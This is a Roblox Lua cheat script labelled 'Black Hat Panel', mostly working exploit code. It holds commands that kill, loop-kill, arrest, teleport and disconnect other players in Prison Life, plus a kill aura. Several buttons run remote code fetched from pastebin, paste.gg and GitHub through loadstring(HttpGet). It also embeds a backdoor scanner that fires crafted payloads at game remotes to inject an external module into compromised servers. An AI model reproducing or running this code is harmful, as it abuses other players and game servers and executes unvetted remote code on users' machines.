			Notify("Turn anti lag on", Color3.fromRGB(0, 255, 0), "Success")
			for _, v in pairs(game:GetDescendants()) do
				pcall(function()
					v.Material = Enum.Material.Plastic
					States[v.Name] = {Material = v.Material}
				end)
			end
			while wait() do
				if States.BoostFps then
					for i,v in pairs(game.Players:GetChildren()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health < 1 then
									v.Character:Destroy()
								end
							end)
						end
					end
				end
			end
		end
		if Command("unantilag") then
			States.BoostFps = false
			Notify("Turn anti lag off", Color3.fromRGB(0, 255, 0), "Success")
			for _, v in pairs(game:GetDescendants()) do
				pcall(function()
					v.Material = States[v.Name].Material
				end)
			end
		end
		if Command("serverhop") or Command("newserver") or Command("changeserver") then
			Notify("Changing server", Color3.fromRGB(0, 255, 0), "Success")
			wait(.1)
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end
		if Command("nexus") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
		end
		if Command("cafe") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(877, 100, 2256)
		end
		if Command("backnexus") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(982, 100, 2334)
		end
		if Command("yard") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(791, 98, 2498)
		end
		if Command("crimbase") or Command("criminalbase") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-943, 95, 2055)
		end
		if Command("armory") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(789, 100, 2260)
		end
		if Command("lunchroom") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(905, 100, 2226)
		end
		if Command("gate") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(505, 103, 2250)
		end
		if Command("tower") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(822, 131, 2588)
		end
		if Command("gatetower") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(502, 126, 2306)
		end
		if Command("sewer") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916, 79, 2311)
		end
		if Command("makecrimall") then
			local savedcf = GetPos()
			local CrimPad = workspace["Criminals Spawn"].SpawnLocation
			local padcf = CrimPad.CFrame
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
			wait()
			CrimPad.CFrame = GetPos()
			CrimPad.CanCollide = false
			CrimPad.Transparency = 1.000
			CrimPad.Anchored = true
			repeat wait() 
				pcall(function()
					for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							Teleport(v, CrimPad.CFrame)
						end
					end
					for i,v in pairs(game.Teams.Guards:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							Teleport(v, CrimPad.CFrame)
						end
					end
				end)
			until #game.Teams.Criminals:GetPlayers() == (#game.Players:GetPlayers()-#game.Teams.Neutral:GetPlayers())
			workspace.Remote.loadchar:InvokeServer()
			CrimPad.Transparency = 0.000
			CrimPad.CFrame = padcf
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			Notify("Make everyone crimmed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("bringall") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					Teleport(v, GetPos())
				end
			end
			Notify("Broght all", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("notify") then
			States.Notify = true
			Notify("Notify on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nonotify") then
			States.Notify = false
			Notify("Notify off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if PrefixCommand("getprefix") then
			Chat("Prefix : "..Prefix)
			Notify("Prefix : "..Prefix, Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("cmd") or Command("cmds") then
			if Background.Visible == true then
				Background.Visible = false
			else
				Background.Visible = true
			end
			Notify("Showed Commands", Color3.fromRGB(0, 255, 0), "Success")
		end

	end

	function AdminPlayerChatted(Message, Player)
		Split = Message:split(" ")
		Arg1 = Split[1]
		Arg2 = Split[2]
		Arg3 = Split[3]
		Arg4 = Split[4]
		if Command("nexus") then
			Teleport(Player, CFrame.new(888, 100, 2388))
		end
		if Command("cafe") then
			Teleport(Player, CFrame.new(877, 100, 2256))
		end
		if Command("backnexus") then
			Teleport(Player,  CFrame.new(982, 100, 2334))
		end
		if Command("armory") then
			Teleport(Player, CFrame.new(789, 100, 2260))
		end
		if Command("tower") then
			Teleport(Player, CFrame.new(822, 131, 2588))
		end
		if Command("crimbase") or Command("criminalbase") then
			Teleport(Player, CFrame.new(-942, 94, 2055))
		end
		if Command("bring") then
			TeleportV(GetPlayer(Arg2), Player)
		end
		if Command("void") then
			Teleport(GetPlayer(Arg2), CFrame.new(99999, 99999, 99999))
		end
		if Command("beam") then
			Beam(GetPlayer(Arg2), math.huge, 1)
		end
		if Command("yard") then
			Teleport(Player, CFrame.new(791, 98, 2498))
		end
		if Command("disconnect") then
			States.Disconnect = true
			while wait() do
				if States.Disconnect then
					coroutine.wrap(function()
						pcall(function()
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

							local Gun = game.Players.LocalPlayer.Backpack["Remington 870"] or game.Players.LocalPlayer.Character["Remington 870"]

							local args = {
								[1] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [2] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [3] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [4] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [5] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [6] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [7] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [8] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}
							}

							game:GetService("ReplicatedStorage").ShootEvent:FireServer(args, Gun)
						end)
					end)()
				end
			end
		end
		if Command("undisconnect") then
			States.Disconnect = false
		end
		if Command("spamarrest") then
			local GP = GetPlayer(Arg2)
			if GP then
				States.SpamArrest2 = true
				repeat wait()
					local Time = 0
					pcall(function()
						if GP.TeamColor.Name == "Bright orange" then
							Teleport(GP, GetPos())
							repeat wait(.01)
								Time = Time + 1
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = GP.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
								workspace.Remote.arrest:InvokeServer(GP.Character.Head)
							until GP.Character.Head:FindFirstChild("handcuffedGui") or Time >= 250
							if GP.Character.Head:FindFirstChild("handcuffedGui") then
								Arrest(GP, 10000)
							end
						end
						if GP.TeamColor.Name ~= "Really red" and not GP.Character.Head:FindFirstChild("handcuffedGui") then
							if not States.SpamArrest2 then return end
							repeat Teleport(GP, CFrame.new(-919, 96, 2138)) until GP.TeamColor.Name == "Really red" or not States.SpamArrest2 or not game.Players[GP.Name]
						end
						wait(.1)
						if not GP.Character.Head:FindFirstChild("handcuffedGui") then
							Arrest(GP, 10000)
						end
					end)
				until not States.SpamArrest2 or not game.Players[GP.Name]
			end
		end
		if Command("unspamarrest") then
			States.SpamArrest2 = false
		end
		if Command("killguard") or Command("killguards") then
			for i,v in pairs(game.Teams.Guards:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("killinmate") or Command("killinmates") then
			for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("killcriminal") or Command("killcriminals") then
			for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("killall") or Command("killothers") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("kill") or Command("kills") then
			Kill(GetPlayer(Arg2))
		end
		if Command("loopkill") or Command("loopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and not LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = {Player = Player}
			end
		end
		if Command("unloopkill") or Command("unloopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = nil
			end
		end
		if Command("tase") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Tase(Player)
			end
		end
		if Command("makecrim") then
			Teleport(GetPlayer(Arg2), CFrame.new(-919, 96, 2138))
		end
		if Command("arrest") then
			Arrest(GetPlayer(Arg2))
		end
		if Command("crim") then
			Teleport(Player, CFrame.new(-919, 96, 2138))
		end
		if Command("goto") or Command("to") then
			TeleportV(Player, GetPlayer(Arg2))
		end
		if Command("cmd") or Command("cmds") then
			Chat("/w "..Player.Name.." "..Prefix.."goto [plr] "..Prefix.."to [plr] "..Prefix.."kill [plr] "..Prefix.."kills [plr] "..Prefix.."makecrim [plr] "..Prefix.."arrest [plr] "..Prefix.."tase [plr] "..Prefix.."loopkill [plr] "..Prefix.."unloopkill [plr]") wait(.1)
			Chat("/w "..Player.Name.." "..Prefix.."crim "..Prefix.."tower "..Prefix.."nexus "..Prefix.."backnexus "..Prefix.."cafe "..Prefix.."armory "..Prefix.."bring [plr]") wait(.1)
			Chat("/w "..Player.Name.." "..Prefix.."killall "..Prefix.."killothers "..Prefix.."killinmate "..Prefix.."killinmates "..Prefix.."killguard "..Prefix.."killguards "..Prefix.."killcriminals "..Prefix.."killcriminal "..Prefix.."void [plr]")
			Chat("/w "..Player.Name.." "..Prefix.."spamarrest [plr] "..Prefix.."unspamarrest "..Prefix.."disconnect "..Prefix.." "..Prefix.."beam [plr]")
			Chat("/w "..Player.Name.." "..Prefix.."cmd "..Prefix.."cmds") wait(.1)
		end
	end

	game.Players.LocalPlayer.Chatted:Connect(PlayerChatted)

	spawn(function()
		while wait() do
			for i,v in pairs(LoopKill) do
				pcall(function()
					if v.Player and v.Player.Character and v.Player.Character.Head and v.Player.Character.Humanoid.Health ~= 0 then
						Kill(v.Player)
					end
				end)
			end
		end
	end)

	spawn(function()
		while wait() do
			for i,v in pairs(LoopBeam) do
				pcall(function()
					if v and v.Player and v.Player.Character and v.Player.Character.Head and v.Player.Character.HumanoidRootPart then
						Beam(v.Player, math.huge, 1)
					end
				end)
			end
		end
	end)

	spawn(function()
		while wait() do
			if States.Fast_Punch == true then
				pcall(function()
					getsenv(game.Players.LocalPlayer.Character.ClientInputHandler).cs.isFighting = false
				end)
			end
		end
	end)

	coroutine.wrap(function()
		while wait() do
			if States.Kill_Aura then
				for i,v in pairs(game.Players:GetPlayers()) do
					pcall(function()
						if v ~= game.Players.LocalPlayer then
							local Distance = (v.Character:FindFirstChildOfClass("Part").Position - game.Players.LocalPlayer.Character:FindFirstChildOfClass("Part").Position).magnitude
							if Distance <= 10 then
								for i = 1,25 do
									game.ReplicatedStorage.meleeEvent:FireServer(v)
								end
							end
						end
					end)
				end
			end
		end
	end)()

	function CheckPermissions(Player)
		Player.Chatted:Connect(function(Message)
			if Admin[Player.UserId] then
				AdminPlayerChatted(Message, Player)
			end
		end)
	end

	game.Players.PlayerRemoving:Connect(function(Player)
		if States.Notify then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Game",
				Text = Player.DisplayName.." Rage Quit",
				Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
			})
		end
		if States.ChatNotify then
			Chat(Player.DisplayName.." Rage Quit")
		end
	end)

	game.Players.PlayerAdded:Connect(function(Player)
		if States.Notify then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Game",
				Text = Player.DisplayName.." Joined",
				Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
			})
		end
		if States.ChatNotify then
			Chat(Player.DisplayName.." Joined The Server")
		end
		CheckPermissions(Player)
		CopyChat(Player)
		Died(Player)
		PlayerPickUp(Player)
	end)

	for i,v in pairs(game.Players:GetPlayers()) do
		if v ~= game.Players.LocalPlayer then
			CheckPermissions(v)
			CopyChat(v)
			Died(v)
			PlayerPickUp(v)
		end
	end

	game.Players.LocalPlayer.CharacterAdded:Connect(function()
		States.CAN = false
	end)

	FindCmd.Changed:Connect(function()
		if FindCmd.Text ~= "" then
			for i,v in pairs(CmdHandler:GetChildren()) do
				if v:IsA("TextButton") then
					if not string.lower(v.Text):match(string.lower(FindCmd.Text)) then
						v.Parent = Background
						v.Visible = false
					end
				end
			end
			for i,v in pairs(Background:GetChildren()) do
				if v.Name == "COMMANDS" then
					if string.lower(v.Text):match(string.lower(FindCmd.Text)) then
						v.Parent = CmdHandler
						v.Visible = true
					end
				end
			end
		elseif FindCmd.Text == "" and (#CmdHandler:GetChildren()-1) ~= #Cmd  then
			for i,v in pairs(CmdHandler:GetChildren()) do
				if v:IsA("TextButton") then
					v:Destroy()
				end
			end
			for i,v in pairs(Background:GetChildren()) do
				if v.Name == "COMMANDS" then
					v:Destroy()
				end
			end
			for i = 1,#Cmd do
				local clone = CmdText:Clone()
				clone.Text = Cmd[i].Text
				clone.Name = "COMMANDS"
				local Ins = Instance.new("StringValue", clone)
				Ins.Name = "Title"
				Ins.Value = Cmd[i].Title
				local Ins2 = Instance.new("StringValue", clone)
				Ins2.Name = "TopbarName"
				Ins2.Value = Cmd[i].Text:split(" ")[1]
				clone.Parent = CmdHandler
				clone.MouseButton1Click:Connect(function()
					Execute:CaptureFocus()
					Execute.Text = clone.Text:split(" ")[1]
					Execute.CursorPosition = #Execute.Text + 1
				end)
			end
		end
	end)

	game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(Key)
		if Key == Prefix then
			if Prefix ~= "/" then
				Execute:CaptureFocus()
			end
		end
	end)

	Execute.FocusLost:Connect(function(FocusLost)
		if FocusLost then
			if Execute.Text:sub(1,#Prefix) ~= Prefix then
				PlayerChatted(Prefix..Execute.Text)
			else
				PlayerChatted(Execute.Text)
			end
		end
	end)

	getgenv().DisableScript = function()
		pcall(function()
			CmdGui:Destroy()
			States = {}
			LoopKill = {}
			LoopTase = {}
			Admin = {}
			ScriptDisabled = true
			for i,v in pairs(game.Lighting:GetChildren()) do
				v.Parent = workspace
			end
		end)
	end
	loadstring(game:HttpGet("https://pastebin.com/raw/mHfK0Xk4", true))()
end)

UICorner.CornerRadius = UDim.new(0, 20)
UICorner.Parent = PrisonLifeHack

Next.Name = "Next"
Next.Parent = HomeLol
Next.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Next.BackgroundTransparency = 1.000
Next.BorderSizePixel = 0
Next.Position = UDim2.new(0.793174744, 0, 0.464748204, 0)
Next.Size = UDim2.new(0, 200, 0, 50)
Next.Font = Enum.Font.GothamBold
Next.Text = ">>"
Next.TextColor3 = Color3.fromRGB(255, 255, 255)
Next.TextScaled = true
Next.TextSize = 14.000
Next.TextWrapped = true

BlackHatPanelWelcomeText.Name = "BlackHatPanelWelcomeText"
BlackHatPanelWelcomeText.Parent = HomeLol
BlackHatPanelWelcomeText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BlackHatPanelWelcomeText.BackgroundTransparency = 1.000
BlackHatPanelWelcomeText.BorderSizePixel = 0
BlackHatPanelWelcomeText.Position = UDim2.new(0.237849027, 0, 0.0319701731, 0)
BlackHatPanelWelcomeText.Size = UDim2.new(0, 459, 0, 43)
BlackHatPanelWelcomeText.Font = Enum.Font.SciFi
BlackHatPanelWelcomeText.Text = "Welcome To Black Hat Panel"
BlackHatPanelWelcomeText.TextColor3 = Color3.fromRGB(85, 255, 0)
BlackHatPanelWelcomeText.TextScaled = true
BlackHatPanelWelcomeText.TextSize = 14.000
BlackHatPanelWelcomeText.TextWrapped = true

TextLabel.Parent = HomeLol
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0899689794, 0, 0.112113096, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.Oswald
TextLabel.Text = "This only works in backdoored games"
TextLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

NameChange.Name = "NameChange"
NameChange.Parent = HomeLol
NameChange.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
NameChange.BorderSizePixel = 0
NameChange.Position = UDim2.new(0.335056901, 0, 0.607194245, 0)
NameChange.Size = UDim2.new(0, 211, 0, 47)
NameChange.Font = Enum.Font.Gotham
NameChange.Text = "Name Change"
NameChange.TextColor3 = Color3.fromRGB(255, 255, 255)
NameChange.TextScaled = true
NameChange.TextSize = 14.000
NameChange.TextWrapped = true
NameChange.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/ant-7802/--/main/straightmilk.lua'))()
end)

UICorner_2.CornerRadius = UDim.new(0, 20)
UICorner_2.Parent = NameChange

InvisibleR15.Name = "InvisibleR15"
InvisibleR15.Parent = HomeLol
InvisibleR15.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
InvisibleR15.BorderSizePixel = 0
InvisibleR15.Position = UDim2.new(0.574974179, 0, 0.607194245, 0)
InvisibleR15.Size = UDim2.new(0, 211, 0, 47)
InvisibleR15.Font = Enum.Font.Gotham
InvisibleR15.Text = "FE Invisible R15"
InvisibleR15.TextColor3 = Color3.fromRGB(255, 255, 255)
InvisibleR15.TextScaled = true
InvisibleR15.TextSize = 14.000
InvisibleR15.TextWrapped = true
InvisibleR15.MouseButton1Click:Connect(function()
	--[[Invisibility Toggle

You can find the orginal concept here: https://v3rmillion.net/showthread.php?tid=544634

This method clones the character locally, teleports the real character to a safe location, then sets the character to the clone.
Basically, your real character is in the sky while you are on the ground.


Because of the way this works, games with a decent anti-cheat will fuck this up.
If you turn it off, you have to go to a safe place before going invisible.

Written by: BitingTheDust ; https://v3rmillion.net/member.php?action=profile&uid=1628149
]]
	--Settings:
	local ScriptStarted = false
	local Keybind = "E" --Set to whatever you want, has to be the name of a KeyCode Enum.
	local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
	local NoClip = false --Will make your fake character no clip.

	local Player = game:GetService("Players").LocalPlayer
	local RealCharacter = Player.Character or Player.CharacterAdded:Wait()

	local IsInvisible = false

	RealCharacter.Archivable = true
	local FakeCharacter = RealCharacter:Clone()
	local Part
	Part = Instance.new("Part", workspace)
	Part.Anchored = true
	Part.Size = Vector3.new(200, 1, 200)
	Part.CFrame = CFrame.new(0, -500, 0) --Set this to whatever you want, just far away from the map.
	Part.CanCollide = true
	FakeCharacter.Parent = workspace
	FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

	for i, v in pairs(RealCharacter:GetChildren()) do
		if v:IsA("LocalScript") then
			local clone = v:Clone()
			clone.Disabled = true
			clone.Parent = FakeCharacter
		end
	end
	if Transparency then
		for i, v in pairs(FakeCharacter:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Transparency = 0.7
			end
		end
	end
	local CanInvis = true
	function RealCharacterDied()
		CanInvis = false
		RealCharacter:Destroy()
		RealCharacter = Player.Character
		CanInvis = true
		isinvisible = false
		FakeCharacter:Destroy()
		workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid

		RealCharacter.Archivable = true
		FakeCharacter = RealCharacter:Clone()
		Part:Destroy()
		Part = Instance.new("Part", workspace)
		Part.Anchored = true
		Part.Size = Vector3.new(200, 1, 200)
		Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
		Part.CanCollide = true
		FakeCharacter.Parent = workspace
		FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

		for i, v in pairs(RealCharacter:GetChildren()) do
			if v:IsA("LocalScript") then
				local clone = v:Clone()
				clone.Disabled = true
				clone.Parent = FakeCharacter
			end
		end
		if Transparency then
			for i, v in pairs(FakeCharacter:GetDescendants()) do
				if v:IsA("BasePart") then
					v.Transparency = 0.7
				end
			end
		end
		RealCharacter.Humanoid.Died:Connect(function()
			RealCharacter:Destroy()
			FakeCharacter:Destroy()
		end)
		Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
	end
	RealCharacter.Humanoid.Died:Connect(function()
		RealCharacter:Destroy()
		FakeCharacter:Destroy()
	end)
	Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
	local PseudoAnchor
	game:GetService "RunService".RenderStepped:Connect(
		function()
			if PseudoAnchor ~= nil then
				PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
			end
			if NoClip then
				FakeCharacter.Humanoid:ChangeState(11)
			end
		end
	)

	PseudoAnchor = FakeCharacter.HumanoidRootPart
	local function Invisible()
		if IsInvisible == false then
			local StoredCF = RealCharacter.HumanoidRootPart.CFrame
			RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
			FakeCharacter.HumanoidRootPart.CFrame = StoredCF
			RealCharacter.Humanoid:UnequipTools()
			Player.Character = FakeCharacter
			workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
			PseudoAnchor = RealCharacter.HumanoidRootPart
			for i, v in pairs(FakeCharacter:GetChildren()) do
				if v:IsA("LocalScript") then
					v.Disabled = false
				end
			end

			IsInvisible = true
		else
			local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
			FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame

			RealCharacter.HumanoidRootPart.CFrame = StoredCF

			FakeCharacter.Humanoid:UnequipTools()
			Player.Character = RealCharacter
			workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
			PseudoAnchor = FakeCharacter.HumanoidRootPart
			for i, v in pairs(FakeCharacter:GetChildren()) do
				if v:IsA("LocalScript") then
					v.Disabled = true
				end
			end
			IsInvisible = false
		end
	end

	game:GetService("UserInputService").InputBegan:Connect(
	function(key, gamep)
		if gamep then
			return
		end
		if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
			if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
				Invisible()
			end
		end
	end
	)
	local Sound = Instance.new("Sound",game:GetService("SoundService"))
	Sound.SoundId = "rbxassetid://232127604"
	Sound:Play()
	game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisible Toggle Loaded",["Text"] = "Press "..Keybind.." to become change visibility.",["Duration"] = 20,["Button1"] = "Okay."})
end)

UICorner_3.CornerRadius = UDim.new(0, 20)
UICorner_3.Parent = InvisibleR15

InvisibleR6.Name = "InvisibleR6"
InvisibleR6.Parent = HomeLol
InvisibleR6.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
InvisibleR6.BorderSizePixel = 0
InvisibleR6.Position = UDim2.new(0.0847983658, 0, 0.607194245, 0)
InvisibleR6.Size = UDim2.new(0, 211, 0, 47)
InvisibleR6.Font = Enum.Font.Gotham
InvisibleR6.Text = "FE Invisible R6"
InvisibleR6.TextColor3 = Color3.fromRGB(255, 255, 255)
InvisibleR6.TextScaled = true
InvisibleR6.TextSize = 14.000
InvisibleR6.TextWrapped = true
InvisibleR6.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/2RDvCumP", true))()
end)

UICorner_4.CornerRadius = UDim.new(0, 20)
UICorner_4.Parent = InvisibleR6

LagSwitch.Name = "LagSwitch"
LagSwitch.Parent = HomeLol
LagSwitch.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
LagSwitch.BorderSizePixel = 0
LagSwitch.Position = UDim2.new(0.083764255, 0, 0.376978397, 0)
LagSwitch.Size = UDim2.new(0, 211, 0, 47)
LagSwitch.Font = Enum.Font.Gotham
LagSwitch.Text = "Lag Switch"
LagSwitch.TextColor3 = Color3.fromRGB(255, 255, 255)
LagSwitch.TextScaled = true
LagSwitch.TextSize = 14.000
LagSwitch.TextWrapped = true
LagSwitch.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://paste.gg/p/anonymous/d3492bd620bd4c46b54680ac80b0fa0d/files/161ddd9c992c4ceba3c298458d45188a/raw", true))()
end)

UICorner_5.CornerRadius = UDim.new(0, 20)
UICorner_5.Parent = LagSwitch

BackDoor.Name = "BackDoor"
BackDoor.Parent = HomeLol
BackDoor.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
BackDoor.BorderSizePixel = 0
BackDoor.Position = UDim2.new(0.0847983882, 0, 0.19568345, 0)
BackDoor.Size = UDim2.new(0, 211, 0, 47)
BackDoor.Font = Enum.Font.Gotham
BackDoor.Text = "BackDoor Hack"
BackDoor.TextColor3 = Color3.fromRGB(255, 255, 255)
BackDoor.TextScaled = true
BackDoor.TextSize = 14.000
BackDoor.TextWrapped = true
BackDoor.MouseButton1Click:Connect(function()
	--[[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021  iK4oS
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]

	local LocalPlayer = game:GetService("Players").LocalPlayer
	local requireScript = ("require(7924358164):k4scripts('%s')"):format(LocalPlayer.Name)
	local invCode = "6HndYgC"

	local alternativeSS = {
		run = { [1] = "5#lGIERKWEF" },
		emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
		helpme = { [1] = "helpme" },
		pickett = { [1] = "cGlja2V0dA==" },
		harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/harkedSS.lua"
	}

	local function notify(text)
		game:GetService("StarterGui"):SetCore(
		"SendNotification",
		{
			Title = "backdoor.exe",
			Duration = 3,
			Text = text
		}
		)
	end

	local function attached(possibleWait)
		if possibleWait then wait(possibleWait) end
		return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
	end

	local function validRemote(rm, _className)
		local fullName =  rm:GetFullName()

		if string.find(fullName, "DefaultChat") then return false end
		if string.find(fullName, LocalPlayer.Name) then return false end
		if rm:FindFirstChild("__FUNCTION") then return false end
		if rm.Parent == game:GetService("JointsService") then return false end

		if rm.ClassName ~= _className then return false end

		if getgenv().blacklisted then
			if table.find(getgenv().blacklisted, fullName) then return false end
		end

		return true
	end

	local function harked()
		local backpack = LocalPlayer.Backpack 
		return backpack:FindFirstChild("HandlessSegway") and
			Backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
			Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
	end
	local function emmaBackdoor(rm)
		return rm.Name == "emma" and rm.Parent.Name == "mynameemma"
	end
	local function runBackdoor(rm)
		return rm.Name == "Run" and
			rm.Parent:FindFirstChild("Pages") and rm.Parent:FindFirstChild("R6") and
			rm.Parent:FindFirstChild("Version") and rm.Parent:FindFirstChild("Title")
	end

	local function scanGame()
		notify("Scanning for a backdoor.")
		if harked() then
			loadstring(game:HttpGetAsync(alternativeSS.harked))()
			return
		end

		for _, remote in pairs(game:GetDescendants()) do
			if validRemote(remote, "RemoteEvent") and not attached() then
				if emmaBackdoor(remote) then
					remote:FireServer(unpack(alternativeSS.emma), requireScript)
				end
				if runBackdoor(remote) then
					remote:FireServer(unpack(alternativeSS.run), requireScript)
				end

				remote:FireServer(unpack(alternativeSS.helpme), requireScript)
				remote:FireServer(unpack(alternativeSS.pickett), requireScript)
				remote:FireServer(requireScript)

			end
		end

		for _, remote in pairs(game:GetDescendants()) do
			if validRemote(remote, "RemoteFunction") and not attached() then
				remote:InvokeServer(requireScript)
			end
		end

	end

	local function Main()
		notify("Make sure to join our Discord!\nCode: "..invCode)

		scanGame()

		if not attached(2) then
			notify("Unable to find backdoor.\nGame not backdoored?")
		end
	end

	if game:IsLoaded() then
		pcall(Main)
	end

